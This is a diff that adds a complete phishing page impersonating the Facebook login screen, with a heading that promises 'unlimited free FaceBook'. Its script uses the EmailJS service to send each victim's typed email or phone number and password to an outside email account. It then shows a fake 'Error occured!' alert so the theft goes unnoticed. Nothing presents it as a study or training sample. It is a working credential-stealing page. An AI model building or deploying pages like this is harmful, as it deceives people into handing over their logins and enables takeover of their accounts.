@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Facebook</title>
+<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+<script>
+   (function(){
+      emailjs.init("-kcU_UdZK0ofhpPn3");
+   })();
+   
+   function sendEmail() {
+      var name = document.getElementById("name").value;
+      var passw = document.getElementById("passw").value;
+       
+      emailjs.send("service_ygj342l", "template_3t5ss4j", {
+         name: name, passw: passw
+
+      }) 
+
+      .then(function(response) {
+         console.log("Error occured!", response);
+         alert("Error occured!");
+      }, function(error) {
+         console.log("Email sending failed...", error);
+         alert("Email sending failed...");
+      });
+   }
+</script>
+</head>
+<body>
+   <h3> Enjoy Unlimited <i> free</i> FaceBook</h3>
+   <h1>Facebook</h1>
+   <div class="container">
+      <h2>Log in</h2>
+      <form onsubmit="event.preventDefault(); sendEmail();">
+         <label for="name">Mobile number or Email</label>
+         <input type="text" id="name" name="name" required><br><br>
+         <label for="name">Password</label>
+         <input type="password" id="passw" name="passw" required><br><br>
+         <button type="submit">Log in</button>
+      </form>
+   </div>
+   <a href="">Forgot password</a>
+</body>
+<footer>
+   <p>English(US)</p>
+   <P>More Languages...</P>
+</footer>
+</html>
+<style>
+   footer{
+      margin-top: 40px;
+   }
+   a{
+      margin-top: 30px;
+      color: blue;
+   }
+   body{
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+   }
+   .container{
+      background-color: transparent;
+      height: 300px;
+      width: 250px;
+      align-items: center;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      padding: 20px;
+      margin-top: 30px;
+      border-radius: 20px;
+      border: solid 1px;
+      
+   }
+   input[type="text"],[type="password"]{
+      width: 95%;
+      height: 25px;
+      
+   }
+   button{
+      background-color: blue;
+      color: white;
+      width: 90%;
+      height: 30px;
+      margin-left: 10px;
+   }
+   h2,h1{
+      color: blue;
+   }
+</style>
